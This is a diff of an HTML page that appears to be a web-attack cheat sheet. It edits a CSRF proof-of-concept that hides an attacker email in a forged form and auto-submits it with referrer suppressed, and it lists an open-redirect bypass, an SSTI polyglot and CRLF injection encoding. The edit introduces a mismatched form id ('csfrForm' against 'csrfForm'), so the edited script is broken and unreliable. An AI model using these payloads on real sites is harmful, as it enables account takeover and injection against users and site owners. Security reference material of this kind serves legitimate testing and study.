@@ -693,7 +693,7 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 	<pre><code>		
 &lt;html&gt;
     &lt;body&gt;
-        &lt;form action=&quot;https://ACTION_URL.COM&quot; method=&quot;POST&quot;&gt;
+        &lt;form id="csfrForm" action=&quot;https://ACTION_URL.COM&quot; method=&quot;POST&quot;&gt;
 	    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;ATTACKER@MAIL.HACK&quot; /&gt;
 	    &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;YOUR_CSRF&quot; /&gt;
 	&lt;/form&gt;
@@ -704,8 +704,8 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
     	<li> To avoid sending the referrer header:
 		<pre><code>&lt;meta name="referrer" content="never"></code></pre>
 	<li> To send malicious request automatic:
- 		<pre><code>&lt;script type="text/javascript">
-	document.forms[0].submit();
+ 		<pre><code>&lt;script>
+	document.getElementById('csrfForm').submit();
 &lt;/script></code></pre>
 
 <h3 id='n2.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Chains </h3>
@@ -713,13 +713,13 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
  		<pre><code>?u=example2\.com  ❎
 ?u=example\.com@example2\.com ✅</code></pre>
 
-<h3 id='n2.5'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SSTI </h3>
+<h3 id='n2.5'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSTI</h3>
 <ul>
 	<li>Polyglot:
 		<pre><code>${{&lt;%[%'"}}%\</code></pre>
 </ul>
 
-<h3 id='n2.5'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CRLF</h3>
+<h3 id='n2.6'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CRLF</h3>
 	<code>%0D%0A</code>
  		<ul>
 			<li>%0D — CR (Carriage Return)</li>
